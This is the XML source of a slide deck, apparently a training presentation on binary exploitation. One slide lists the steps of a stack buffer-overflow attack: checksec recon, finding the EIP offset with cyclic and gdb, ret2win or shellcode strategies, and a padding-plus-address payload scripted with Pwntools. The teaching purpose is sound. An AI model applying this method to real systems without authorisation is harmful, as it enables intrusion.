            <a:endParaRPr lang="en-US" sz="10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5403" y="1848892"/>
            <a:ext cx="135731" cy="214313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7542572" y="1695301"/>
            <a:ext cx="1172747" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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7542572" y="1695301"/>
            <a:ext cx="1172747" cy="528638"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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AUTOMATE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428625" y="2552551"/>
            <a:ext cx="2619356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1. Recon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428625" y="2788295"/>
            <a:ext cx="285750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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="714375" y="2788295"/>
            <a:ext cx="617265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checksec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331640" y="2788295"/>
            <a:ext cx="1535906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see what shields are</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2968284"/>
            <a:ext cx="425053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active.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3262294" y="2552551"/>
            <a:ext cx="2619356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2. Crash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3262294" y="2784723"/>
            <a:ext cx="1907381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Send a large input to find the</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3262294" y="2964712"/>
            <a:ext cx="1157288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vulnerable buffer.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6095963" y="2552551"/>
            <a:ext cx="2619356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3. Offset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6095963" y="2788295"/>
            <a:ext cx="271463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6367425" y="2788295"/>
            <a:ext cx="462948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cyclic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6830374" y="2788295"/>
            <a:ext cx="335756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7166130" y="2788295"/>
            <a:ext cx="231502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gdb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7397632" y="2788295"/>
            <a:ext cx="1092994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find the exact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6095963" y="2968284"/>
            <a:ext cx="971550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distance to EIP.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428625" y="3366157"/>
            <a:ext cx="2619356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4. Strategy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428625" y="3601901"/>
            <a:ext cx="567928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Choose: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996553" y="3601901"/>
            <a:ext cx="540079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ret2win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1536632" y="3601901"/>
            <a:ext cx="60722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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1597354" y="3601901"/>
            <a:ext cx="1388790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variable overwrite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2986143" y="3601901"/>
            <a:ext cx="25003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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3785462"/>
            <a:ext cx="171450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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="600075" y="3785462"/>
            <a:ext cx="694395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shellcode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1294470" y="3785462"/>
            <a:ext cx="28575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3262294" y="3366157"/>
            <a:ext cx="2619356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5. Payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3262294" y="3601901"/>
            <a:ext cx="350044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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3612338" y="3601901"/>
            <a:ext cx="2237445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padding + p32(target_address)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5849782" y="3601901"/>
            <a:ext cx="28575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950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6095963" y="3366157"/>
            <a:ext cx="2619356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6. Automate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Text 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6095963" y="3598329"/>
            <a:ext cx="2260997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Script it with Pwntools for a reliable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Text 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6095963" y="3778318"/>
            <a:ext cx="453628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exploit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Shape 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4450556"/>
            <a:ext cx="9144000" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4450556"/>
            <a:ext cx="9144000" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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"Pwn is a process, not a miracle."</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="264319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7" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="7144"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEEEE"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Text 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4879181"/>
            <a:ext cx="9144000" cy="26431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Hiddeninvestigations.Net</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Text 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8301038" y="285750"/>
            <a:ext cx="414338" cy="5179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33</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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4784"/>
            <a:ext cx="9101138" cy="4805363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangles 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="616585" y="3775710"/>
            <a:ext cx="1150620" cy="815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514350" y="319831"/>
            <a:ext cx="648008" cy="194519"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="341337" cy="1024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1337" cy="102463"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="341337" h="102463">
                  <a:moveTo>
                    <a:pt x="51231" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="290106" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="303693" y="0"/>
                    <a:pt x="316724" y="5398"/>
                    <a:pt x="326332" y="15005"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="335940" y="24613"/>
                    <a:pt x="341337" y="37644"/>
                    <a:pt x="341337" y="51231"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="341337" y="51231"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="341337" y="79526"/>
                    <a:pt x="318400" y="102463"/>
                    <a:pt x="290106" y="102463"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="51231" y="102463"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="37644" y="102463"/>
                    <a:pt x="24613" y="97065"/>
                    <a:pt x="15005" y="87458"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5398" y="77850"/>
                    <a:pt x="0" y="64819"/>
                    <a:pt x="0" y="51231"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="51231"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="0" y="37644"/>
                    <a:pt x="5398" y="24613"/>
                    <a:pt x="15005" y="15005"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="24613" y="5398"/>
                    <a:pt x="37644" y="0"/>
                    <a:pt x="51231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341337" cy="111988"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="25399" tIns="25399" rIns="25399" bIns="25399" rtlCol="0" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPts val="2275"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr sz="900"/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978512" y="346682"/>
            <a:ext cx="140817" cy="14081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25399" tIns="25399" rIns="25399" bIns="25399" rtlCol="0" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPts val="2275"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr sz="900"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="AutoShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="4633913"/>
            <a:ext cx="829304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 rot="0">
            <a:off x="1072600" y="2716208"/>
            <a:ext cx="1535129" cy="1460657"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="962392" cy="9157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62392" cy="915704"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="962392" h="915704">
                  <a:moveTo>
                    <a:pt x="85734" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="876658" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="899396" y="0"/>
                    <a:pt x="921203" y="9033"/>
                    <a:pt x="937281" y="25111"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="953359" y="41189"/>
                    <a:pt x="962392" y="62996"/>
                    <a:pt x="962392" y="85734"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="962392" y="829971"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="962392" y="852709"/>
                    <a:pt x="953359" y="874515"/>
                    <a:pt x="937281" y="890594"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="921203" y="906672"/>
                    <a:pt x="899396" y="915704"/>
                    <a:pt x="876658" y="915704"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="85734" y="915704"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="62996" y="915704"/>
                    <a:pt x="41189" y="906672"/>
                    <a:pt x="25111" y="890594"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="9033" y="874515"/>
                    <a:pt x="0" y="852709"/>
                    <a:pt x="0" y="829971"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="85734"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="0" y="62996"/>
                    <a:pt x="9033" y="41189"/>
                    <a:pt x="25111" y="25111"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="41189" y="9033"/>
                    <a:pt x="62996" y="0"/>
                    <a:pt x="85734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62392" cy="925229"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="25399" tIns="25399" rIns="25399" bIns="25399" rtlCol="0" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPts val="2275"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr sz="9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861976" y="2311192"/>
            <a:ext cx="1650664" cy="1781291"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3301327" h="3562583">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3301328" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3301328" y="3562583"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="356258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868248" y="690236"/>
            <a:ext cx="5778548" cy="2508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65"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="836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Thank You</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="836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96145" y="346682"/>
            <a:ext cx="1311584" cy="299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Hidden Investigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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03633" y="4686703"/>
            <a:ext cx="2001161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5"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="105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Hiddeninvestigations.Net</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="105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112026" y="4686703"/>
            <a:ext cx="1695372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5"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="105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hi@hiddeninvestigations.net</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="105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358405" y="2505167"/>
            <a:ext cx="4316254" cy="52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0"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="176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Learn together, to build a skilled community</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="176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17773</Words>
  <Application>WPS Presentation</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>1173</Paragraphs>
  <Slides>36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74" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>SimSun</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Poppins Bold</vt:lpstr>
      <vt:lpstr>Li Sirajee Sanjar Unicode</vt:lpstr>
      <vt:lpstr>Poppins Bold</vt:lpstr>
      <vt:lpstr>Poppins Bold</vt:lpstr>
      <vt:lpstr>Poppins SemiBold</vt:lpstr>
      <vt:lpstr>Poppins SemiBold</vt:lpstr>
      <vt:lpstr>Poppins SemiBold</vt:lpstr>
      <vt:lpstr>Poppins</vt:lpstr>
      <vt:lpstr>Poppins</vt:lpstr>
      <vt:lpstr>Poppins</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Microsoft YaHei</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>monospace</vt:lpstr>
      <vt:lpstr>monospace</vt:lpstr>
      <vt:lpstr>monospace</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>MingLiU-ExtB</vt:lpstr>
      <vt:lpstr>Quicksand Bold</vt:lpstr>
      <vt:lpstr>Quicksand Bold</vt:lpstr>
      <vt:lpstr>Quicksand Bold</vt:lpstr>
      <vt:lpstr>Source Code Pro</vt:lpstr>
      <vt:lpstr>Source Code Pro</vt:lpstr>
      <vt:lpstr>Source Code Pro</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial 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WPS_1717093415</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-10T13:36:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-10T15:57:04Z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251B07F018434C4DAD51CA205082339E_12</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>2057-12.2.0.23206</vt:lpwstr>
  </property>
</Properties>
</file>